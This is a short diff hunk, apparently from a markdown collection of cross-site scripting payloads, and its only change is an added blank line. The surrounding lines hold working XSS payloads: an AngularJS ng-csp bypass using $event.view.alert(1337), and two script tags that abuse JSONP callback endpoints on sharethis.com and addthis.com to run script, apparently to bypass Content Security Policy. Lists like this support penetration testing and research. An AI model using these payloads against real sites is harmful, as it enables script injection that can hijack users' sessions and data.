@@ -84,6 +84,7 @@ ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com
 
 ## Others
 <li>Payloads</li>
+
 ```
 "><script+src="https://www.sharethis.com/get-publisher-info.php?callback=alert(1337)"></script>
 "><script+src="https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(1337)"></script>
